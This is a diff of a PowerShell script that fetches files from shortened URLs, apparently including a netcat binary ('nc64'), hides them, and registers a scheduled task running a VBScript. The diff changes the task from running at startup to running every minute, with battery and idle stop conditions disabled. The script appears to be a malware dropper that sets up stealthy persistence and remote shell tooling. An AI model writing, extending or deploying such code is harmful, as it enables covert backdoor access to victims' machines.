@@ -25,7 +25,6 @@ $scriptVbsPath = Join-Path $installPath "script.vbs"
 # URLs for files
 $quietTxtUrl = "https://rb.gy/mx0i5"
 $nc64TxtUrl = "https://rb.gy/guty9"
-$scriptVbsUrl = "https://rb.gy/3lld2p"
 
 # Download files
 Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath -UseBasicParsing
@@ -40,7 +39,8 @@ foreach ($file in $filesToHide) {
 
 # Create a scheduled task
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
-$trigger = New-ScheduledTaskTrigger -AtStartup
+$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1)
+$trigger.Repetition = $(New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionDuration (New-TimeSpan -Hours 24) -RepetitionInterval (New-TimeSpan -Minutes 1)).Repetition
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
 
 try {
